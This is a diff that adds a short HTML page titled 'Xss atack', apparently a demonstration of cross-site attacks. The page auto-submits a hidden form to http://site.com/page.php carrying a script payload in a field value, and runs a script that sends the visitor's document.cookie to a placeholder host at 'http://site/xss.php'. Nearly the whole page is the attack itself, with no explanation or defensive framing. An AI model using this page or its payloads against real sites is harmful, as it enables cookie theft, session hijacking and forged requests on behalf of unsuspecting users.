@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Xss atack</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:ital,wght@1,200&display=swap" rel="stylesheet">
+</head>
+<body>
+	<img src="http://site.com/">
+	<header class="header">
+		<h1 class="title">Hello,user</h1>
+	</header>
+	<form method="post" action="http://site.com/page.php">
+		<input type="hidden" name="var" value="<script>alert('xss')</script>">
+	</form>
+	<script type="text/javascript">
+		document.getElementsByTagName('form')[0].submit();
+		var img = new Image();
+		img.src = 'http://site/xss.php?' + document.cookie;
+	</script>
+</body>
+
+</html>
